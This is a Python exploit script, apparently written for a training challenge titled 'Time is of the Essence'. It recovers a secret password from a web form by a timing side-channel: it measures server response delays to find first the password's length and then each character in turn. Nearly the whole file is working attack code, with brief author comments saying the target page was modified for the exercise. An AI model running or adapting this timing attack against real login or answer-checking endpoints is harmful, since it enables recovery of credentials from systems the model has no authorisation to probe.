#!/bin/env python3
# Training: Time is of the Essence exploit
# Author: Adam "element" Vins
# First of all the exploit is ugly, but I'm still a beginner. Second, I had to customize response in index.php because it's not possible to detect a difference in server response time if sleep is 0,01 seconds?
# Yes, I could bruteforce [a-zA-Z]{12} but that's not how we rockin'.
# The length check is one second, the char check is 2 seconds.

import requests
import sys
import time

proxies = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}

alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

def attack(url):
    print('[i] Checking for password length!')
    print("[+] The password length is {0} characters long.".format(string_length_check(url)))
    print("[i] Finding the password.")
    password = ''
    tmp = 'A' * string_length_check(url)
    field_tmp = list(tmp)
    indexik = 0
    for i in range(string_length_check(url)):
        for letter in alphabet:
            field_tmp[indexik] = letter
            new_tmp = ''.join(field_tmp)
            data = { 'answer' : new_tmp }
            res = requests.post(url + '/index.php', data=data, proxies=proxies)
            if(res.elapsed.total_seconds() >= (1 + 2 * (i+1))):
                password += letter
                sys.stdout.write('\r[+] Password: ' + password)
                break
            else:
                sys.stdout.write('\r[+] Password: ' + password)
                sys.stdout.flush()
        indexik += 1

    if len(password) != string_length_check(url):
        print("\n[-] Something went wrong!")

def string_length_check(url):
    password_length = ''
    while True:
        data = {'answer': password_length}
        res = requests.post(url + '/index.php', data=data, proxies=proxies)
        if(res.elapsed.total_seconds() >= 1):
            return len(password_length)
            break
        password_length += 'A'
        
def main():
    if len(sys.argv) !=2:
        print("[+] Usage: {0} <url>".format(sys.argv[0]))
        print("[+] Example: {0} www.example.com".format(sys.argv[0]))
        sys.exit(-1)

    string_length_check(sys.argv[1])
    attack(sys.argv[1])
    
    
if __name__ == "__main__":
    main()
